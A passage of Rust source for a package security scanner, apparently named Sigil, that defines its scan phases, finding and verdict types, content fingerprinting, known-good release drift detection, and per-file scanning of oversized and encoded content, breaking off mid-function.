pub mod budget;
pub mod bundled;
pub mod cloud_sigs;
pub mod context;
pub mod correlate;
pub mod derive;
pub mod manifests;
pub mod normalize;
pub mod phases;
pub mod profile;
pub mod scoring;
pub mod suppress;
pub mod timing;
pub mod typosquat;

use ignore::WalkBuilder;
use rayon::prelude::*;
use serde::{Deserialize, Serialize};
use std::fmt;
use std::path::{Path, PathBuf};

pub use crate::corpus::schema::Evidence;

/// The scan phases, each targeting a different threat category.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum Phase {
    /// Phase 1: Install hooks
    InstallHooks,
    /// Phase 2: Dangerous code patterns
    CodePatterns,
    /// Phase 3: Network and exfiltration
    NetworkExfil,
    /// Phase 4: Credential access
    Credentials,
    /// Phase 5: Obfuscation
    Obfuscation,
    /// Phase 6: Provenance
    Provenance,
    /// Phase 7: Prompt injection detection
    PromptInjection,
    /// Phase 8: Skill / plugin security
    SkillSecurity,
    /// Phase 10: Inference security
    InferenceSecurity,
}

impl Phase {
    /// Every phase, in canonical scan order.
    ///
    /// This is the single enumeration of phases in the codebase. Anything that
    /// needs to iterate phases, or that needs to prove it handles all of them,
    /// goes through here — see `phase_registry_is_total` in the tests below.
    pub const ALL: [Phase; 9] = [
        Phase::InstallHooks,
        Phase::CodePatterns,
        Phase::NetworkExfil,
        Phase::Credentials,
        Phase::Obfuscation,
        Phase::Provenance,
        Phase::PromptInjection,
        Phase::SkillSecurity,
        Phase::InferenceSecurity,
    ];

    /// The canonical `snake_case` identifier, as used in signature packs,
    /// cloud signatures and the `--phases` CLI flag.
    pub fn canonical_name(self) -> &'static str {
        match self {
            Phase::InstallHooks => "install_hooks",
            Phase::CodePatterns => "code_patterns",
            Phase::NetworkExfil => "network_exfil",
            Phase::Credentials => "credentials",
            Phase::Obfuscation => "obfuscation",
            Phase::Provenance => "provenance",
            Phase::PromptInjection => "prompt_injection",
            Phase::SkillSecurity => "skill_security",
            Phase::InferenceSecurity => "inference_security",
        }
    }

    /// The human-readable label used in terminal output.
    pub fn display_name(self) -> &'static str {
        match self {
            Phase::InstallHooks => "Install Hooks",
            Phase::CodePatterns => "Code Patterns",
            Phase::NetworkExfil => "Network/Exfil",
            Phase::Credentials => "Credentials",
            Phase::Obfuscation => "Obfuscation",
            Phase::Provenance => "Provenance",
            Phase::PromptInjection => "Prompt Injection",
            Phase::SkillSecurity => "Skill Security",
            Phase::InferenceSecurity => "Inference Security",
        }
    }

    /// The phase's severity-weight multiplier.
    ///
    /// Provenance findings carry per-finding weights (1–3) and override this.
    pub fn default_weight(self) -> u32 {
        match self {
            Phase::InstallHooks => 10,
            Phase::CodePatterns => 5,
            Phase::NetworkExfil => 3,
            Phase::Credentials => 2,
            Phase::Obfuscation => 5,
            Phase::Provenance => 1,
            Phase::PromptInjection => 10,
            Phase::SkillSecurity => 5,
            Phase::InferenceSecurity => 5,
        }
    }

    /// Parse a phase name, accepting `snake_case`, `kebab-case` and
    /// `concatenated` spellings, case-insensitively.
    ///
    /// Returns `None` for an unrecognised name. Callers must decide what an
    /// unknown phase means for them — silently defaulting to a real phase
    /// gives a rule the wrong weight and files it under the wrong heading.
    pub fn from_name(name: &str) -> Option<Phase> {
        let normalized: String = name
            .chars()
            .filter(|c| !matches!(c, '_' | '-' | ' '))
            .flat_map(|c| c.to_lowercase())
            .collect();
        Phase::ALL
            .into_iter()
            .find(|p| p.canonical_name().replace('_', "") == normalized)
    }
}

impl fmt::Display for Phase {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.display_name())
    }
}

/// Severity level for an individual finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for Severity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Severity::Low => write!(f, "LOW"),
            Severity::Medium => write!(f, "MEDIUM"),
            Severity::High => write!(f, "HIGH"),
            Severity::Critical => write!(f, "CRITICAL"),
        }
    }
}

/// A single security finding discovered during scanning.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Finding {
    pub phase: Phase,
    pub rule: String,
    pub severity: Severity,
    pub file: String,
    pub line: Option<usize>,
    pub snippet: String,
    pub weight: u32,
    /// Whether this advisory appears in the CISA Known Exploited Vulnerabilities catalogue.
    /// Only set for OSV-derived findings; defaults to false for all other findings.
    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
    pub kev: bool,
    /// FIRST EPSS exploit-probability score (0.0–1.0).
    /// Only set for OSV-derived CVE findings; defaults to 0.0 for all other findings.
    #[serde(default, skip_serializing_if = "is_zero_f32")]
    pub epss: f32,
    /// Content-anchored identity for this finding.
    ///
    /// Deliberately **excludes the line number**: identity keyed on
    /// `(rule, file, line)` makes every finding below an inserted line look
    /// new and resolved at once, which churns `sigil diff` and re-raises
    /// every GitHub Code Scanning alert on any drift. Assigned centrally by
    /// [`assign_fingerprints`] once a result set is complete, because
    /// disambiguating repeats of the same rule and snippet in one file needs
    /// to see all of them.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub fingerprint: String,
    /// Where the finding lives when it is inside a container, as a composable
    /// locator: `npm://left-pad-1.3.0.tgz|tar://package/dist/index.js`.
    ///
    /// Modelled on Ghidra's FSRL, which addresses a file inside an archive
    /// inside an image by composing `fstype://path` segments with `|`. `file`
    /// alone points into a temporary extraction directory, which says nothing
    /// about which artifact the finding came from.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub locator: Option<String>,
    /// Whether a Critical finding here gates `CRITICAL RISK` on its own, or
    /// needs a second Critical rule to corroborate it. Copied from the rule
    /// that produced the finding; see [`crate::corpus::schema::Evidence`] and
    /// [`scoring::determine_verdict`].
    ///
    /// Serialized only when it is not the default, so a finding from a rule
    /// that says nothing about evidence keeps exactly the JSON it had before
    /// this field existed, and a cached result written without the key still
    /// deserializes.
    #[serde(default, skip_serializing_if = "Evidence::is_standalone")]
    pub evidence: Evidence,
}

/// Detect a package that partly matches a published release.
///
/// If several files under a directory are byte-identical to
/// `npm:lodash@4.17.21` and a sibling file is not the published bytes, the
/// tree is a *modified copy* of that release. That is the `event-stream` /
/// `ua-parser-js` shape, and Sigil could not previously observe it at any
/// severity: without something to compare against, a trojanised library is
/// just code.
///
/// Reported as Critical, because the whole point of the known-good corpus is
/// that drift is a finding rather than a suppression.
/// Does the tree rooted at `root` declare itself to be `coordinate`?
///
/// `coordinate` is `"<ecosystem>:<name>@<version>"`. The manifest an ecosystem
/// puts beside its files is the only place a tree states its own identity, so
/// that is what is read: `package.json` for npm, and `PKG-INFO` or `METADATA`
/// for Python. A tree that ships no manifest cannot claim anything, and drift
/// is not reported against it.
fn tree_claims_release(strip_base: &Path, root: &str, coordinate: &str) -> bool {
    let Some((ecosystem, rest)) = coordinate.split_once(':') else {
        return false;
    };
    let Some((name, version)) = rest.rsplit_once('@') else {
        return false;
    };
    let base = strip_base.join(root);

    match ecosystem {
        "npm" => {
            let Ok(text) = std::fs::read_to_string(base.join("package.json")) else {
                return false;
            };
            let Ok(doc) = serde_json::from_str::<serde_json::Value>(&text) else {
                return false;
            };
            doc.get("name").and_then(|v| v.as_str()) == Some(name)
                && doc.get("version").and_then(|v| v.as_str()) == Some(version)
        }
        "pypi" => {
            // sdists carry PKG-INFO at the root; wheels carry METADATA inside
            // `<name>-<version>.dist-info/`.
            let mut candidates = vec![base.join("PKG-INFO")];
            if let Ok(entries) = std::fs::read_dir(&base) {
                for entry in entries.flatten() {
                    let p = entry.path();
                    if p.is_dir()
                        && p.file_name()
                            .and_then(|n| n.to_str())
                            .is_some_and(|n| n.ends_with(".dist-info") || n.ends_with(".egg-info"))
                    {
                        candidates.push(p.join("METADATA"));
                        candidates.push(p.join("PKG-INFO"));
                    }
                }
            }
            candidates.iter().any(|path| {
                let Ok(text) = std::fs::read_to_string(path) else {
                    return false;
                };
                let mut has_name = false;
                let mut has_version = false;
                for line in text.lines().take(64) {
                    if let Some(v) = line.strip_prefix("Name: ") {
                        // PyPI normalises `_`, `.` and `-` to the same name.
                        let norm = |s: &str| s.trim().to_ascii_lowercase().replace(['_', '.'], "-");
                        has_name = norm(v) == norm(name);
                    } else if let Some(v) = line.strip_prefix("Version: ") {
                        has_version = v.trim() == version;
                    }
                }
                has_name && has_version
            })
        }
        _ => false,
    }
}

fn detect_knowngood_drift(
    files: &[PathBuf],
    strip_base: &Path,
    known_good: &crate::knowngood::KnownGood,
    recognised: &std::collections::HashMap<String, (String, String)>,
) -> Vec<Finding> {
    use std::collections::{HashMap, HashSet};

    if recognised.is_empty() {
        return Vec::new();
    }

    // Where each recognised release is rooted in the scanned tree.
    //
    // A recognised file's scanned path ends with its path inside the release
    // (`vendor/leftpad/package/index.js` ends with `package/index.js`), so the
    // prefix is where that release was unpacked. Anchoring on the release's
    // own layout rather than on directory adjacency is what lets drift be
    // detected in a subdirectory of the package.
    let mut roots: HashMap<(String, String), usize> = HashMap::new();
    for (scanned_path, (coordinate, index_path)) in recognised {
        if let Some(prefix) = scanned_path.strip_suffix(index_path.as_str()) {
            *roots
                .entry((coordinate.clone(), prefix.to_string()))
                .or_insert(0) += 1;
        }
    }

    let present: HashSet<&str> = files
        .iter()
        .filter_map(|f| f.strip_prefix(strip_base).ok())
        .filter_map(|p| p.to_str())
        .collect();

    let mut out = Vec::new();
    let mut reported: HashSet<String> = HashSet::new();

    for ((coordinate, root), anchors) in &roots {
        // Require more than one anchor: a single coincidental match (an empty
        // file, a common LICENSE) is not evidence that a tree is that release.
        if *anchors < 2 {
            continue;
        }

        // And require the tree to say it *is* this release. Anchors alone only
        // establish that some files are byte-identical to it, which is exactly
        // what a neighbouring version of the same package looks like: most of
        // its files never changed. Without this check, installing an index and
        // scanning any other version of an indexed package reports every file
        // that legitimately changed between the two as a trojanised release —
        // measured on the genuine, registry-signed semver 7.7.2 tarball, which
        // produced eleven Critical findings against an index built from a
        // different 7.x.
        if !tree_claims_release(strip_base, root, coordinate) {
            continue;
        }

        for index_path in known_good.release_paths(coordinate) {
            let expected = format!("{root}{index_path}");
            // Only files the release is supposed to contain, that exist here,
            // and whose bytes are not the published bytes.
            if !present.contains(expected.as_str()) || recognised.contains_key(&expected) {
                continue;
            }
            if !reported.insert(expected.clone()) {
                continue;
            }

            out.push(Finding {
                phase: Phase::Provenance,
                rule: "KNOWNGOOD-DRIFT-001".to_string(),
                severity: Severity::Critical,
                file: expected.clone(),
                line: None,
                snippet: format!(
                    "Modified copy of a published release: {anchors} sibling file(s) match \
                     {coordinate} exactly, but this file differs from the published bytes. \
                     A library that is mostly a known release with local modifications is \
                     the trojanised-dependency shape."
                ),
                weight: 10,
                kev: false,
                epss: 0.0,
                fingerprint: String::new(),
                locator: Some(format!("{coordinate}|file://{expected}")),
                evidence: Default::default(),
            });
        }
    }

    out
}

/// Run every enabled content phase over one unit of content.
///
/// Factored out of the scan loop so the same phase set applies to a file and
/// to anything derived from it. `rel_path` stays the originating file for
/// derived units, so file-filtered rules (a `setup.py`-gated install-hook
/// rule, say) still apply to a payload decoded out of that file.
fn run_phases(
    rel_path: &str,
    contents: &str,
    should_run_phase: &impl Fn(Phase) -> bool,
    cloud_sigs: &[cloud_sigs::CompiledCloudSignature],
    budget: &budget::FileBudget,
) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();

    if should_run_phase(Phase::InstallHooks) {
        out.extend(timing::measure(timing::Stage::PhaseInstallHooks, || {
            phases::scan_install_hooks(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::CodePatterns) {
        out.extend(timing::measure(timing::Stage::PhaseCodePatterns, || {
            phases::scan_code_patterns(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::NetworkExfil) {
        out.extend(timing::measure(timing::Stage::PhaseNetworkExfil, || {
            phases::scan_network_exfil(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::Credentials) {
        out.extend(timing::measure(timing::Stage::PhaseCredentials, || {
            phases::scan_credentials(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::Obfuscation) {
        out.extend(timing::measure(timing::Stage::PhaseObfuscation, || {
            phases::scan_obfuscation(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::PromptInjection) {
        out.extend(timing::measure(timing::Stage::PhasePromptInjection, || {
            phases::scan_prompt_injection(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::SkillSecurity) {
        out.extend(timing::measure(timing::Stage::PhaseSkillSecurity, || {
            phases::scan_skill_security(rel_path, contents, budget)
        }));
    }
    if should_run_phase(Phase::InferenceSecurity) {
        out.extend(timing::measure(
            timing::Stage::PhaseInferenceSecurity,
            || phases::scan_inference_security(rel_path, contents, budget),
        ));
    }

    // Cloud signatures (from ~/.sigil/signatures.json)
    if !cloud_sigs.is_empty() {
        out.extend(timing::measure(timing::Stage::CloudSignatures, || {
            cloud_sigs::scan_with_cloud_signatures(rel_path, contents, cloud_sigs)
        }));
    }

    out
}

/// Assign content-anchored fingerprints across a complete result set.
///
/// The fingerprint covers the rule, the file, the normalised snippet, and an
/// occurrence index that distinguishes genuine repeats of the same rule and
/// text within one file. It does not cover the line number, so moving code
/// around a file does not change any finding's identity.
pub fn assign_fingerprints(findings: &mut [Finding]) {
    use sha2::{Digest, Sha256};
    use std::collections::HashMap;

    let mut seen: HashMap<(String, String, String), usize> = HashMap::new();
    for f in findings.iter_mut() {
        let snippet = normalize_snippet(&f.snippet);
        let key = (f.rule.clone(), f.file.clone(), snippet.clone());
        let occurrence = seen.entry(key).or_insert(0);

        let mut hasher = Sha256::new();
        for part in [
            f.rule.as_str(),
            f.file.as_str(),
            snippet.as_str(),
            &occurrence.to_string(),
        ] {
            hasher.update(part.as_bytes());
            hasher.update([0u8]);
        }
        f.fingerprint = format!("{:x}", hasher.finalize())
            .chars()
            .take(32)
            .collect();
        *occurrence += 1;
    }
}

/// Collapse whitespace so reindentation does not change a fingerprint.
pub(crate) fn normalize_snippet(snippet: &str) -> String {
    snippet.split_whitespace().collect::<Vec<_>>().join(" ")
}

fn is_zero_f32(v: &f32) -> bool {
    *v == 0.0
}

/// Overall risk classification.
///
/// This is a **report label**. It is written to JSON, SARIF, HTML and the terminal,
/// cached under `.sigil/cache`, read back from a diff baseline, and rewritten
/// in-process at several sites. Before changing how a verdict is assigned, read
/// this table — changing a value's verdict changes what the program *does*:
///
/// | site | effect |
/// |---|---|
/// | `main.rs::acquisition_exit_code` | LOW gives 0, everything else 1. CI contract, ADR-0010. |
/// | `main.rs` `--auto-approve` gate | fires on LOW only; pins content to the ledger. |
/// | `enforcement::level_for` into `sandbox::safe_run` | `Blocked` refuses to execute, and `--auto-approve` cannot override it. |
/// | `enforcement::level_for` into `sandbox::safe_run` | `Confirm` prompts — the ONLY human confirmation in the run path. |
/// | `enforcement::level_for` into `policy::generate` | which sandbox preset the container is built from. |
///
/// MEDIUM and LOW reach `Gate::Proceed` and run with **no prompt**.
///
/// The three execution consumers key on [`crate::enforcement::EnforcementLevel`],
/// which is the max of this label and the same verdict recomputed from `findings`.
/// A write to this field therefore cannot *lower* a gate — only raise one. It can
/// still lower the acquisition exit code and re-enable `--auto-approve`, which stay
/// on the label deliberately. It can also be bypassed by moving findings out of
/// `findings` rather than rewriting this field; see [`crate::enforcement`].
///
/// Deliberately not `Ord`: no consumer should be able to write `>= HighRisk`.
/// Pinned end to end by the enforcement table in `crate::enforcement` — do not add
/// a consumer without adding a row there.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[allow(clippy::enum_variant_names)]
pub enum Verdict {
    LowRisk,
    MediumRisk,
    HighRisk,
    CriticalRisk,
}

impl fmt::Display for Verdict {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Verdict::LowRisk => write!(f, "LOW RISK"),
            Verdict::MediumRisk => write!(f, "MEDIUM RISK"),
            Verdict::HighRisk => write!(f, "HIGH RISK"),
            Verdict::CriticalRisk => write!(f, "CRITICAL RISK"),
        }
    }
}

/// The result of a complete scan across all phases.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScanResult {
    pub findings: Vec<Finding>,
    pub score: u32,
    pub verdict: Verdict,
    pub files_scanned: usize,
    pub duration_ms: u64,
    /// Findings suppressed by a trust-ledger approval (F-010). Kept in the
    /// result — never silently dropped — but excluded from score, verdict, and
    /// exit code. Suppression is all-or-nothing per artifact (exact-digest
    /// approval), so attribution lives at result level, not per finding.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub suppressed_findings: Vec<Finding>,
    /// Attribution for the suppression, e.g. `ledger:lodash@4.17.20#ab12cd34
    /// approved 2026-06-11`. `None` when nothing is suppressed.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub suppressed_by: Option<String>,
    /// What produced this result: engine version and corpus identity.
    ///
    /// `None` on results written by an older binary, which is why `diff`
    /// degrades gracefully rather than assuming it is present.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub scanner: Option<ScannerInfo>,
    /// Findings silenced by an inline `sigil:ignore` marker (see
    /// `scanner::suppress`). Kept separate from the ledger's all-or-nothing
    /// `suppressed_findings` because they are per-finding decisions with
    /// their own attribution, and must survive ledger re-evaluation.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub inline_suppressed: Vec<Finding>,
    /// One attribution per inline-suppressed finding:
    /// `file:line RULE-ID — reason`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub inline_suppressions: Vec<String>,
    /// What the tree is, judged from its shallowest manifest: `npm`, `pypi`,
    /// `agent-skill`, `mcp-server`, `claude-plugin`, `vscode-extension`,
    /// `agent-instructions`, `cargo`, `go`, `maven`, `rubygems` or
    /// `generic`. Empty on results written by an older binary.
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub platform: String,
}

/// Provenance of a scan: which engine and which detection corpus ran.
///
/// `cache.rs` already refuses to serve a result produced by a different
/// scanner version, because a stale verdict after a detection upgrade is a
/// security bug. This carries the same discipline into the output contract so
/// consumers — `sigil diff` above all — can tell a code change from a rules
/// change.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct ScannerInfo {
    /// The `sigil` binary version that produced the result.
    pub engine_version: String,
    /// Stable digest over every active rule's id and pattern.
    pub corpus_digest: String,
    /// Number of active content rules.
    pub corpus_rule_count: usize,
    /// Every active rule ID, sorted — lets `diff` attribute a new finding to
    /// a newly added rule rather than to changed code.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub rule_ids: Vec<String>,
}

fn phase_from_name(name: &str) -> Option<Phase> {
    Phase::from_name(name)
}

fn severity_from_name(name: &str) -> Option<Severity> {
    match name.to_lowercase().as_str() {
        "low" => Some(Severity::Low),
        "medium" => Some(Severity::Medium),
        "high" => Some(Severity::High),
        "critical" => Some(Severity::Critical),
        _ => None,
    }
}

/// Directories that are never content-scanned: vendored/generated trees whose
/// contents produce noise without manifest context (ADR-0008). Dependency
/// *manifests* (package.json, lockfiles) at the project root are still scanned.
///
/// `dist/` and `build/` are deliberately absent. In a published npm package
/// they *are* the shipped code (230 of the 844 malicious packages in the
/// evaluation set carry files under `dist/`), and in a git checkout the
/// project's own `.gitignore` already keeps build output out of the walk.
const DEFAULT_EXCLUDED_DIRS: &[&str] = &[
    "node_modules",
    ".git",
    "target",
    ".next",
    "__pycache__",
    ".venv",
    "venv",
    ".tox",
    ".mypy_cache",
    ".pytest_cache",
];

/// Files larger than this are not read whole for content scanning. They are
/// not skipped either: see [`oversized_excerpt`].
const MAX_CONTENT_SCAN_BYTES: u64 = 10_000_000;

/// How much of each end of an oversized file is still scanned. Padding a
/// script past a scanner's size cap is a cheap evasion — the evaluation set
/// has a 22 MB `setup.py` that writes an executable from one enormous bytes
/// literal and runs it on the line after — and the payload sits at one end
/// or the other of the padding, never inside it.
const OVERSIZED_EXCERPT_BYTES: usize = 2_000_000;

/// Past this even the excerpt is skipped; the Provenance phase still sees the
/// file's size.
const OVERSIZED_MAX_BYTES: u64 = 512_000_000;

/// How many of the slowest files `SIGIL_TIMING=1` lists.
const TIMING_SLOWEST_FILES: usize = 15;

/// The scanned parts of an oversized file.
struct OversizedExcerpt {
    head: String,
    tail: String,
    /// Newlines before the tail starts: tail line `i` (1-based) is file
    /// line `tail_line_offset + i`.
    tail_line_offset: usize,
}

/// Read the first and last [`OVERSIZED_EXCERPT_BYTES`] of a text file and
/// count the newlines in between, so tail findings carry real line numbers.
/// Returns `None` for binary content or a file past [`OVERSIZED_MAX_BYTES`].
fn oversized_excerpt(path: &Path, len: u64) -> Option<OversizedExcerpt> {
    use std::io::{Read, Seek, SeekFrom};
    if len > OVERSIZED_MAX_BYTES {
        return None;
    }
    let mut file = std::fs::File::open(path).ok()?;
    let mut head = vec![0u8; OVERSIZED_EXCERPT_BYTES];
    let mut filled = 0;
    while filled < head.len() {
        match file.read(&mut head[filled..]) {
            Ok(0) => break,
            Ok(n) => filled += n,
            Err(_) => return None,
        }
    }
    head.truncate(filled);
    if head.contains(&0) {
        return None;
    }
    let excerpt = OVERSIZED_EXCERPT_BYTES as u64;
    let tail_start = len.saturating_sub(excerpt).max(excerpt);
    let mut newlines = head.iter().filter(|b| **b == b'\n').count();
    let mut pos = excerpt;
    let mut buf = vec![0u8; 1 << 20];
    while pos < tail_start {
        let want = ((tail_start - pos) as usize).min(buf.len());
        match file.read(&mut buf[..want]) {
            Ok(0) => break,
            Ok(n) => {
                newlines += buf[..n].iter().filter(|b| **b == b'\n').count();
                pos += n as u64;
            }
            Err(_) => return None,
        }
    }
    file.seek(SeekFrom::Start(tail_start)).ok()?;
    let mut tail = Vec::new();
    file.read_to_end(&mut tail).ok()?;
    if tail.contains(&0) {
        tail.clear();
    }
    Some(OversizedExcerpt {
        head: String::from_utf8_lossy(&head).into_owned(),
        tail: String::from_utf8_lossy(&tail).into_owned(),
        tail_line_offset: newlines,
    })
}

/// Collect candidate files honoring `.gitignore` (only inside real git repos —
/// `require_git(true)` — so a malicious `.gitignore` inside an extracted
/// tarball cannot hide files from the scanner), `.sigilignore` (always), and
/// the hard default excludes above. Dotfiles are walked: instruction files
/// like `.cursorrules` are a primary scan target.
pub(crate) fn collect_files(path: &Path) -> Vec<PathBuf> {
    let mut builder = WalkBuilder::new(path);
    builder
        .follow_links(false)
        .hidden(false)
        .git_ignore(true)
        .require_git(true)
        .git_global(false)
        .git_exclude(false)
        .ignore(false)
        .parents(false)
        .add_custom_ignore_filename(".sigilignore");
    builder.filter_entry(|entry| {
        let is_dir = entry.file_type().is_some_and(|t| t.is_dir());
        if !is_dir {
            return true;
        }
        let name = entry.file_name().to_string_lossy();
        !DEFAULT_EXCLUDED_DIRS.contains(&name.as_ref())
    });
    let mut files: Vec<PathBuf> = builder
        .build()
        .filter_map(|e| e.ok())
        .filter(|e| e.file_type().is_some_and(|t| t.is_file()))
        .map(|e| e.into_path())
        .collect();
    files.sort();
    files
}

pub fn run_scan(
    path: &Path,
    phase_filter: Option<&[String]>,
    min_severity: Option<&str>,
) -> ScanResult {
    let start = std::time::Instant::now();

    let mut findings: Vec<Finding> = Vec::new();

    let active_phases: Option<Vec<Phase>> =
        phase_filter.map(|names| names.iter().filter_map(|n| phase_from_name(n)).collect());

    let min_sev: Option<Severity> = min_severity.and_then(severity_from_name);

    let should_run_phase = |phase: Phase| -> bool {
        match &active_phases {
            Some(phases) => phases.contains(&phase),
            None => true,
        }
    };

    // Load cloud signatures (if available — gracefully returns empty if
    // offline) and compile them once, not once per file.
    let cloud_sigs = cloud_sigs::compile_cloud_signatures(&cloud_sigs::load_cloud_signatures());

    // Known-good corpus (ADR-0011). Absent by default; a verification failure
    // is fatal, because an index that can suppress findings is a trust input.
    let known_good = match crate::knowngood::load_installed() {
        Ok(kg) => kg,
        Err(e) => {
            eprintln!("[known-good] fatal: {e}");
            std::process::exit(2);
        }
    };

    let files = timing::measure(timing::Stage::Walk, || collect_files(path));
    let files_scanned = files.len();

    // When the target is a single file, relative paths must be taken against
    // its parent — otherwise strip_prefix(file) yields "" and filename-gated
    // phases (e.g. install hooks keying on "setup.py") silently never fire.
    let strip_base: &Path = if path.is_file() {
        path.parent().unwrap_or(path)
    } else {
        path
    };
    let platform = manifests::detect_platform(strip_base, &files).to_string();

    if should_run_phase(Phase::Provenance) {
        timing::measure(timing::Stage::Provenance, || {
            findings.extend(phases::scan_provenance(strip_base, &files));
            findings.extend(typosquat::scan(strip_base, &files));
        });
    }

    // One clock per file, read once: `configured_budget` parses an
    // environment variable, which is not something to do 2,794 times.
    let file_budget_limit = budget::configured_budget();

    // Content phases run per-file in parallel; collect() preserves file order
    // so results stay deterministic. Each file yields its active findings and
    // the ones an inline `sigil:ignore` marker set aside, with attribution.
    type FileOutcome = (Vec<Finding>, Vec<(Finding, String)>);
    let per_file: Vec<FileOutcome> = files
        .par_iter()
        .map(|file_path| {
            let file_start = std::time::Instant::now();
            let none: FileOutcome = (Vec::new(), Vec::new());
            // An oversized file yields its head as `contents` and its tail
            // separately; a normal file yields its whole text and no tail.
            let read = timing::measure(timing::Stage::Read, || {
                match std::fs::metadata(file_path) {
                    Ok(meta) if meta.len() > MAX_CONTENT_SCAN_BYTES => {
                        oversized_excerpt(file_path, meta.len())
                            .map(|ex| (ex.head, Some((ex.tail, ex.tail_line_offset))))
                    }
                    Ok(_) => match std::fs::read(file_path) {
                        Ok(bytes) => {
                            // Skip binary files (contains null bytes) and use lossy UTF-8
                            if bytes.contains(&0) {
                                None
                            } else {
                                Some((String::from_utf8_lossy(&bytes).into_owned(), None))
                            }
                        }
                        Err(_) => None,
                    },
                    Err(_) => None,
                }
            });
            let Some((contents, tail)) = read else {
                return none;
            };

            let rel_path = file_path
                .strip_prefix(strip_base)
                .unwrap_or(file_path)
                .to_string_lossy()
                .to_string();

            let mut file_findings: Vec<Finding> = Vec::new();

            // SKILL-007: a skill or MCP manifest that does not parse.
            if should_run_phase(Phase::SkillSecurity) {
                file_findings.extend(timing::measure(timing::Stage::Manifests, || {
                    manifests::malformed_manifest(&rel_path, &contents)
                }));
            }

            // Invisible-Unicode inspection runs on the RAW contents, then all
            // pattern phases match against the de-cloaked form so zero-width
            // splitting cannot hide tokens like `eval(` (ADR-0008).
            if should_run_phase(Phase::Obfuscation) {
                file_findings.extend(timing::measure(timing::Stage::Invisible, || {
                    normalize::inspect_invisible(&rel_path, &contents)
                }));
            }
            // Owned copy of the normalised text: the worklist takes one copy,
            // and the marker parser and the correlation pass read the other.
            let source_text: String = timing::measure(timing::Stage::Normalize, || {
                normalize::normalize_for_matching(&contents).into_owned()
            });
            let markers = timing::measure(timing::Stage::Markers, || {
                suppress::parse_markers(&source_text)
            });

            // Everything below is on one file's clock. When it runs out the
            // remaining work is dropped and the truncation is reported, so a
            // file that defeats the analyser cannot look like a clean file.
            let file_budget = budget::FileBudget::start(file_budget_limit);

            // The file itself is the depth-0 analysis unit, scanned directly
            // rather than through the queue: a full copy of the text just to
            // push it into a worklist costs a megabyte of memcpy on exactly
            // the large files that are already the slowest.
            file_findings.extend(run_phases(
                &rel_path,
                &source_text,
                &should_run_phase,
                &cloud_sigs,
                &file_budget,
            ));

            // Analysis is a bounded worklist, not a single pass. A phase that
            // decodes something enqueues the decoded content, and every phase
            // then runs over that too — so a payload hidden inside base64
            // reaches the install-hook, exfiltration and credential rules
            // instead of only tripping one obfuscation rule on its shape.
            let mut derive_budget = derive::DeriveBudget::new();
            let mut derived_units = 0usize;
            let mut queue: Vec<derive::DerivedUnit> = if file_budget.expired() {
                Vec::new()
            } else {
                timing::measure(timing::Stage::Derive, || {
                    derive::derive_units(&source_text, 0, &mut derive_budget)
                })
            };
            derived_units += queue.len();

            while let Some(unit) = queue.pop() {
                if file_budget.expired() {
                    break;
                }
                let unit_findings = run_phases(
                    &rel_path,
                    &unit.contents,
                    &should_run_phase,
                    &cloud_sigs,
                    &file_budget,
                );

                // Re-anchor findings from decoded content onto the line of
                // the parent file that carried the blob, so a finding still
                // points at a real line of a real file, and record how the
                // content was obtained.
                file_findings.extend(unit_findings.into_iter().map(|mut f| {
                    f.line = Some(unit.parent_line);
                    f.snippet = format!("[decoded {}] {}", unit.via, f.snippet);
                    f.locator = Some(format!("file://{}|{}", rel_path, unit.via));
                    f
                }));

                let derived = timing::measure(timing::Stage::Derive, || {
                    derive::derive_units(&unit.contents, unit.depth, &mut derive_budget)
                });
                derived_units += derived.len();
                for d in derived {
                    queue.push(d);
                }
            }

            // The tail of an oversized file is scanned once, without the
            // decode worklist, and its findings are re-numbered onto the
            // real lines of the file.
            if let Some((tail_text, offset)) = tail {
                let tail_start = std::time::Instant::now();
                let tail_norm = normalize::normalize_for_matching(&tail_text);
                let tail_findings = run_phases(
                    &rel_path,
                    &tail_norm,
                    &should_run_phase,
                    &cloud_sigs,
                    &file_budget,
                );
                file_findings.extend(tail_findings.into_iter().map(|mut f| {
                    f.line = f.line.map(|l| l + offset);
                    f.snippet = format!("[tail of oversized file] {}", f.snippet);
                    f
                }));
                timing::add(timing::Stage::OversizedTail, tail_start.elapsed());
            }

            // Truncation is a finding, not a silent shortcut: without it a
            // file the analyser gave up on is indistinguishable from a file
            // with nothing in it.
            //
            // Filed under Provenance because it describes the scan rather than
            // the code, but emitted whatever `--phases` selects: a phase
            // filter chooses which rules to run, and cannot be allowed to
            // choose whether the caller is told that some of them did not
            // finish. It is Medium, not Low, for the same reason — a file that
            // defeats the analyser must not read as less suspicious than one
            // that was analysed and found wanting. Truncation still loses the
            // findings that file would have produced; the point of reporting
            // it is that the loss is never silent.
            let budget_exhausted = file_budget.expired();
            if budget_exhausted {
